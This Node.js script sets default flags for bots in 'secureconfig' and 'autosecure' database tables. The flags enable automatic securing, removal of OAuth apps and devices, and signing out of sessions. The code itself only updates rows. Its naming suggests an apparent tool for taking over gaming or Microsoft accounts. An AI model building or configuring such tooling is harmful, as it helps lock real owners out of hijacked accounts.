/**
 * Update Bot Default Settings
 * Sets the correct default values for existing bots
 */

const { queryParams } = require('./database');

async function updateBotDefaults() {
    console.log('\n🔧 Updating bot default settings...\n');

    try {
        // Update secureconfig table
        console.log('📋 Updating secureconfig...');
        const secureConfigUpdate = await queryParams(`
            UPDATE secureconfig SET
                auto_secure = 1,
                oauthapps = 1,
                removedevices = 1,
                signout = 1,
                secureifnomc = 1
        `);
        console.log(`   ✅ Updated secureconfig records`);

        // Update autosecure table
        console.log('📋 Updating autosecure...');
        const autosecureUpdate = await queryParams(`
            UPDATE autosecure SET
                auto_secure = 1,
                oauthapps = 1,
                removedevices = 1,
                signout = 1,
                secureifnomc = 1
        `);
        console.log(`   ✅ Updated autosecure records`);

        // Get counts
        const secureCount = await queryParams('SELECT COUNT(*) as count FROM secureconfig');
        const botCount = await queryParams('SELECT COUNT(*) as count FROM autosecure');

        console.log('\n✅ Update completed successfully!');
        console.log('\n📊 Summary:');
        console.log(`   - secureconfig: ${secureCount[0].count} records`);
        console.log(`   - autosecure: ${botCount[0].count} bots`);
        console.log('\n🔧 Settings updated:');
        console.log('   ✅ Auto Secure: ON');
        console.log('   ✅ Secure Non-MC: ON');
        console.log('   ✅ Remove oAuths: ON');
        console.log('   ✅ Remove Devices: ON');
        console.log('   ✅ Signout Sessions: ON\n');

    } catch (error) {
        console.error('❌ Error updating defaults:', error);
        throw error;
    }
}

// Run if executed directly
if (require.main === module) {
    updateBotDefaults()
        .then(() => {
            console.log('✅ Script finished');
            process.exit(0);
        })
        .catch((error) => {
            console.error('❌ Script failed:', error);
            process.exit(1);
        });
}

module.exports = { updateBotDefaults };
